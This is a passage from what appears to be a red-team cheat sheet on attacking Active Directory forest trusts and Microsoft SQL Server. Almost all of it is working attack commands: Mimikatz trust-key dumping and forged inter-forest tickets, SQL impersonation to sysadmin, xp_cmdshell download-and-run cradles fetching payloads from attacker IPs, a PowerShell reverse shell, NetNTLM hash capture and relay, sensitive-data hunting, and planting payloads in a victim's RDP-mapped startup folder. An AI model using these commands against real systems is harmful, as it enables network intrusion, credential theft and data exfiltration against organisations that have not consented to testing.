#### Check access to server
```
dir \\<SERVER NAME>\<SHARE>\
```

### SID history enabled
- This is fine but why can't we access all resources just like Intra forest?
- SID Filtering is the answer. It filters high privilege SIDs from the SIDHistory of a TGT crossing forest boundary. This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.
- If a external trust has SID history enabled. It is possible to inject a SIDHistory for RID => 1000 (higher then 1000) to access resources accessible to that identity or group in the target trusting forest. Needs to be user created!
- This means, if we have an external trust (or a forest trust with SID history enabled /enablesidhistory:yes), we can inject a SIDHistory for RID > 1000 to access resources accessible to that identity or group in the target trusting forest. 

#### Enumerate if SIDFilteringForestAware is enabled
- Run on the DC.
```
Get-ADTrust -Filter *
```

#### Enumerate groups of the target forest with SID higher then 1000
```
Get-ADGroup -Filter 'SID -ge "<TARGET FOREST SID>-1000"' -Server <TARGET FOREST>
```
 
#### Get trust key
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```
 
#### Get domain SID
```
Get-DomainSID
```
 
#### Create a intern-forest TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids:<SID OF THE GROUP>  /ticket:<KIRBI FILE>"'
```

#### Create and inject TGS
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
```

#### Create a TGS for a service (kekeo_old)
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
./asktgs.exe <KIRBI FILE> <SERVICE>/<TARGET SERVER>
```

#### Inject the TGS
```
./kirbikator.exe lsa <KIRBI FILE>
```

#### Use the TGS and execute DCsync or psremoting etc!

## SQL Server
- Could be possible cross domain or cross forest!
```
. .\PowerUpSQL.ps1
```
 
#### Find possible SQL admins or groups that have access to SQL
```
Get-DomainGroup | Where-Object -Property samaccountname -Match SQL
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```
 
### Locating and accessing SQL Servers
#### Discovery of SQL instances (SPN scanning)
```
Get-SQLInstanceDomain
 
$data = Get-DomainComputer -Domain <DOMAIN> | Where-Object serviceprincipalname -Match MSSQL | Select-Object -ExpandProperty serviceprincipalname | Select-String MSSQL
$data = $data -replace 'MSSQLSvc/', ''
```

#### UDP Scan
```
Get-SQLInstanceScanUDP -Computername <COMPUTER LIST> 
```
 
#### Check Local Instance
```
Get-SQLInstanceLocal 
```

### Initial foothold
- Unauthenticated / Local user / Domain user --> SQL Login
#### Check for weak passwords or default credentials
- Might want to check for default applications with backend SQL Server express for default instances/credentials those applications use.
- Never got it to work as described in the blog: https://h4ms1k.github.io/Red_Team_MSSQL_Server/#
```
Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw -Verbose
spray weak credentials against the sa account
```
 
#### Check accessibility to SQL servers with current credentials
```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose
```
 
#### Check accessibility with other user account
- Might need runas?
```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose -Username <USERNAME> -Password <PASSWORD>
```

#### Gather information
- If connection succes! Connect to the DB with heidiSQL and look in it!
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```
 
### Initial Recon
#### Check if sysadmin query
```
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### Check for xp_cmdshell
```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

### Privilege Escalation to sysadmin
#### Audit for issues
```
Invoke-SQLAudit -Verbose -Instance <SQL INSTANCE>
```
 
#### Try to excalate privileges
```
Invoke-SQLEscalatePriv
```
 
### SQL Server enumerate login
- Try weak passwords against the enumerated users!
#### Blind SQL Server login enum
```
SELECT name FROM sys.syslogins;
SELECT name FROM sys.server_principals;
 
SELECT SUSER_NAME(1)
SELECT SUSER_NAME(2)
SELECT SUSER_NAME(3)

Get-SQLFuzzServerLogin -Instance <COMPUTERNAME>\<INSTANCENAME>
```
 
#### Blind SQL Domain Account Enum.
```
-- Get the domain where SQL Server is.--
SELECT DEFAULT_DOMAIN() as mydomain
-- Full RID of Domain Admins group.--
SELECT SUSER_SID('<Identified_Domain>\Domain Admins')
-- grab the first 48 bytes of the full RID to get domain’s SID. Create a new RID (will be associated with a domain object) by appending a hex number value to the previous SID. --
SELECT SUSER_NAME(RID) –> Get the domain object name associated to the RID.

Get-SQLFuzzDomainAccount -Instance <COMPUTERNAME>\<INSTANCENAME>
```

#### Check for weak passwords or default credentials
- Enumerate all SQL Logins as least privilege user and test username as password.
```
Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw -Verbose
```
 
### Impersonation attack
#### Check if impersonation is possible PowerUpSQL
- Might be able to use the ```-exploit``` flag to exploit it
```
Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug
```

#### Check if impersonation is possible
```
-- Find users that can be impersonated
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

#### Impersonate a user 
- Might be possible to impersonate user a and then user b and then sa!
```
-- Verify you are still running as the normal user login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Impersonate the sa login
EXECUTE AS LOGIN = 'sa'
-- Verify you are now running as the sa login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### Enable and run xp_cmdshell
```
-- Enable show options
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
GO
-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
GO
-- Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
```
 
#### Impersonate exploit script
- https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
```
Import-Module .\Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance <INSTANCE> -SqlUser <USER> -SqlPass <PASSWORD>
```
 
#### Check for impersonation through link
```
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
```
 
### Create Stored procedure as DB_Owner
- Prerequisites:
 - db_owner role
 - owner of the database high privileged user
 - Database set to thrustworthy (To enable xp_cmdshell)
 
#### Check the db_owner role
```
select rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
```
 
#### Check the owner of the database
```
SELECT suser_sname(owner_sid), * FROM sys.databases
```
 
#### Create a stored procedure
```
USE <DB>;
CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember '<USER TO MAKE SYSADMIN>','sysadmin'
```

#### Execute procedure
```
USE <DB>
EXEC sp_elevate_me
```
 
#### Verify user is sysadmin
```
SELECT is_srvrolemember('sysadmin')
```

#### Automatic execution of stored procedures
- Found and abused with PowerUpSQL
```
invoke-SQLAudit
invoke-SQLEscalatedPriv
```

#### DB_Owner exploit script
- https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
```
Import-Module .\Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser <USER> -SqlPass <PASSWORD> -SqlServerInstance <INSTANCE>
```
 
### Command execution
![image](https://user-images.githubusercontent.com/43987245/151711534-6114738f-6c9c-49b2-8c5f-0cb27f5fa6d0.png)

#### Check xp_cmdshell
```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```
 
#### Enable and run xp_cmdshell
```
-- Enable show options
EXEC sp_configure 'show advanced options',1
RECONFIGURE
GO
-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
GO
-- Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
```
 
#### Execute commands trick
- Prevents having to deal with the escaped, qoutes, double qoutes etc
```
$str = 'IEX ((new-object net.webclient).downloadstring("http://x.x.x.x:8090/payload"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) | clip
EXEC xp_cmdshell 'powershell.exe -w hidden -enc <BASE64 STRING>';
```
 
#### Execute commands examples
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query "exec master..xp_cmdshell 'whoami'"
Invoke-SQLOSCmd -Instance <SQL INSTANCE> -Verbose -Command "Whoami" -Threads 10
 
Invoke-SQLOSCLR -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
Invoke-SQLOSOLe -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
Invoke-SQLOSR -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
```

#### Execute command through links example
```
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
```

#### Execute reverse shell example
```
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
```
 
### Database links
#### Search for links to remote servers
- Check if `RPC_OUT` is enabled. If yes and link is configured with sysadmin we can enable xp_cmdshell.
```
Get-SQLServerLink -Instance <SQL INSTANCE> -Verbose
```

#### Crawl links to remote servers
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Verbose
```

#### Crawl links and show servers where we are sysadmin
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> | Where-Object -Property sysadmin -Match 1
```

#### Crawl and try to use xp_cmdshell on every link
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami'''
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami''' | Where-Object CustomQuery
```

### Manual queries
- https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links
- There is two methods ```openquery()``` and ```EXECUTE AT```.
- Some times you won't be able to perform actions like exec xp_cmdshell from ```openquery()``` in those cases it might be worth it to test ```EXCUTE AT```

#### Manually enumerate database links query
```
SELECT * FROM master..sysservers
```
 
#### Query a link - for example for more for links or information
```
SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'SELECT * FROM master..sysservers;')
SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'select @@servername');
SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```
 
#### Example with double or tripple queries
```
SELECT * FROM OPENQUERY("sql-1.test.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
SELECT * FROM OPENQUERY("sql-1.test.io", 'select * from openquery("sql01.test.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```

#### EXECUTE AT Enable xp_cmdshell
- RPC out needs to be enabled - this isn't default!
```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT "<DB>"
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "<DB>"
EXEC('exec master..xp_cmdshell ''whoami''') AT "<SERVER>\<DB>"
```
 
#### EXECUTE AT enable RPC Out
- Requires to be sysadmin on the SQL server, not sysadmin for the configured link!
- Enter Srvname from enumerating links
```
EXEC sp_serveroption
@server='<SERVER>\<DB>', @optname='rpc out', @optvalue='True'
```
 
### Privilege escalation Service Accounts
#### Shared service account
- If multiple SQL Servers share the same service account. Comprimising one server comprimises them all!
 
#### Check as what the server is running
```
Get-SQLInstanceDomain | Get-SQLServerInfo | Select-object Instance, ServiceAccount
```

#### UNC PATH INJECTION
- Public role has access to xp_dirtree and xp_fileexists to abuse UNC PATH INJECTION
- https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e
 
#### Capture NetNTLM password hash
```
.\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
EXEC xp_dirtree '\\<IP>\pwn', 1, 1
```

```
sudo responder -I eth0
Get-SQLInstanceDomain | Invoke-SQLUncPathInjection
```
 
#### Capture NetNTLM password hash and relay it example
```
import-module .\PowerUpSQL.ps1
Import-Module \Scripts\3rdparty\Inveigh.ps1
Import-Module \Scripts\pending\Get-SQLServiceAccountPwHashes.ps1
Get-SQLServiceAccountPwHashes -Verbose -TimeOut 20 -CaptureIp <ATTACKER IP>
 

python smbrelayx.py -h <SQL SERVER IP> -c 'powershell empire launcher'
msf > use auxiliary/admin/mssql/mssql_ntlm_stealer
set SMBPROXY <ATTACKER IP>
set RHOST <TARGET IP>
set GET_PATH <PATH TO SQLI>
run
```

### Data exfiltration
#### SQLServerPasswordHash
```
Get-SQLServerPasswordHash -Verbose -Instance <INSTANCE> -Migrate
```
 
#### Identify Sensitive Data
```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Get-SQLColumnSampleDataThreaded -Verbose -Threads 20 -Keyword "credit,creditcard,ssn,bsn,password,wachtwoord" -SampleSize 2 -ValidateCC -NoDefaults
```
 
#### Identify sensitive data featuring transparent encryption
```
Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLDatabaseThreaded -Verbose -Threads 10 -NoDefaults | Where-Object {$_.is_encrypted -eq 'TRUE'}| Get-SQLColumnSampleDataThreaded -Verbose -Threads 20 -Keyword "credit,creditcard,ssn,bsn,password,wachtwoord" -SampleSize 2 -ValidateCC -NoDefaults
```

#### SQL Queries
```
#When able to connect directy to the instance
Get-SQLDatabase
Get-SQLTable
Get-SQLColumn
Get-SQLQuery -Query "use <DATABASE>; SELECT * from <TABLE>"

#Through links
List databases
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query 'SELECT name FROM master..sysdatabases;' | Where-Object customquery | Select-Object instance, customquery -ExpandProperty customquery | Select-Object instance, name

#List tables
Get-SQLServerLinkCrawl -Instance <INSTANCE> -QueryTarget AC-DBBUSINESS -Query "SELECT name FROM <DATABASE>..sysobjects WHERE xtype = 'U'" | Select-Object -ExpandProperty customquery

#List columns

#List the contents of table
```
 
### SQL Queries
#### Check if current user is sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### Check if a user is sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin','<USER>')
```

#### List all sysadmins
```
SELECT   name,type_desc,is_disabled FROM     master.sys.server_principals  WHERE    IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name
```

## Foreign Security Principals
- A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).

#### Enumerate users who are in groups outside of the user’s current domain
```
Get-DomainForeignUser 
ConvertFrom-SID <SID>
```

#### Enumerates group in the target domain that contain users/groups who are not in the target domain.
```
Get-DomainForeignGroupMember -Domain <TARGET DOMAIN FQDN>
ConvertFrom-SID <SID>
```
 
### Hop trust
- Easiest way is to use the username/password to start a new powershell session or do a runas.
- If you only have the user's RC4/AES keys, we can still request Kerberos tickets with Rubeus but it's more involved. We need an inter-realm key which Rubeus won't produce for us automatically, so we have to do it manually.
 
#### Create TGT
```
.\Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap
```
 
#### Request a referral ticket
- from the current domain, for the target domain.
```
.\Rubeus.exe asktgs /service:krbtgt/<EXTERNAL FQDN> /domain:<FQDN> /dc:<DC FQDN> /ticket:<BASE64 TICKET> /nowrap
```
 
#### Request TGS
```
.\Rubeus.exe asktgs /service:cifs/<EXTERNAL FQDN> /domain:<EXTERNAL FQDN> /dc:<EXTERNAL DC FQDN> /ticket:<BASE64 TICKET> /nowrap
```
 
#### Write ticket to file
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\subsidiary.kirbi", [System.Convert]::FromBase64String("<BASE64 TICKET>"))
```
 
#### Then inject and use the ticket
```
.\Rubeus.exe /ticket:<TICKET BASE64>
.\Rubeus.exe /ticket:<FILE TO KIRBI FILE>
```
 
## ACLS
- Access to resources in a forest trust can also be provided without using FSPs using ACLs.
```
Find-InterestingDomainAcl -Domain <TRUST FOREST>
```
- Abuse ACL to other forest.

## Pam Trust
- PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages. 
- PAM trust provides the ability to access a forest with high privileges without using credentials of the current forest. Thus, better security for the bastion forest which is much desired.
- To achieve the above, Shadow Principals are created in the bastion domain which are then mapped to DA or EA groups SIDs in the production forest.

### Check if current domain is Bastion forest
#### Enumerate if the current domain is a bastion forest
- Run on the DC
- If there are trusts with the attributes ```ForestTransitive -eq $True``` and ```SIDFilteringQuarantined -eq $False``` check for Shadowprincipals. If there are then its a Bastion forest.
```
Get-ADTrust -Filter {(ForestTransitive -eq $True) and (SIDFilteringQuarantined -eq $False)}
```

#### Check which users are members of the shadow principals
- Run on the DC
```
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
```

### Check if current domain is managed by bastion forest
- Now, TrustAttributes is a very good indicator. ```TAPT (TRUST_ATTRIBUTE_PIM_TRUST)``` is ```0x00000400``` (1024 in decimal) for PAM/PIM trust. If this bit and ```TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL (0x00000040)``` are set, the trust is a PAM trust. 
- A trust attribute of ```1096``` is for PAM ```(0x00000400)``` + External Trust ```(0x00000040)``` + Forest Transitive ```(0x00000008)```.
```
Get-ADTrust -Filter {(ForestTransitive -eq $True)}
```
 
### Abuse PAM trusts
- To abuse the PAM trust we must compromise users or groups who are part of the shadow security principals

### Enumerate shadow principals
- Name = name of the shadow principals, member = members of the bastion forest which are mapped to the shadow principals, msDS-ShadowPrincipalSid = SID of the principal (user or group) in the user/production forest whose privileges are assigned to the shadow security principal.
```
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
```

#### Pssession to the other forest machine
- Note if Kerberos AES encryption is not enabled for the trust, we need to modify the WSMan TrustedHosts property and use Negotiate authentication for PSRemoting. ```-Authentication NegotiateWithImplicitCredential```
```
Enter-PSSession <FQDN> 
Enter-PSSession <FQDN> -Authentication NegotiateWithImplicitCredential
```
 
## RDPInception
#### Get foreign groups
```
Get-DomainForeignGroupMember -Domain <DOMAIN>
```
 
#### Check local groups on machines
- Run as DA!
```
Get-DomainGPOUserLocalGroupMapping -Identity "<GROUP>" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName
```
 
#### Check logon sessions on the host
```
net logons
```

#### Check network connections and processes
```
netstat -anop tcp | findstr 3389
ps
```

#### Scan the hosts/subnets in the other doamin
```
nmap -p 139,445,3389,5985 <CIDR>
```

#### Inject in one of the proccesses
```
inject <PID> x64 <BEACON>
```

#### Then move laterally through open ports or query the domain for other privilege escalation methods.
- SMB, winrm, kerberoasting, as-reproasting, password in description, ACL's etc.
- Even if user was not a local admin on any system, or if none of the juicy management ports were available, it can still be possible to move laterally via the established RDP channel. This is where the drive sharing comes into play.
 
### Drive mapping
- When a user enables drive sharing for their RDP session, it creates a mount-point on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into the user's RDP session and use this mount-point to write files directly onto their machine. This is useful for dropping payloads into their startup folder which would be executed the next time they logon.
- Works when users from a outbound trust RDP into a computer in the current domain with drive mapping.
 
#### Check the testclient C Drive
```
ls \\tsclient\c
```

#### Go to the startup folder of the user:
```
cd \\tsclient\c\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```
 
#### Upload paylaod
```
upload C:\Payloads\pivot.exe
```
 
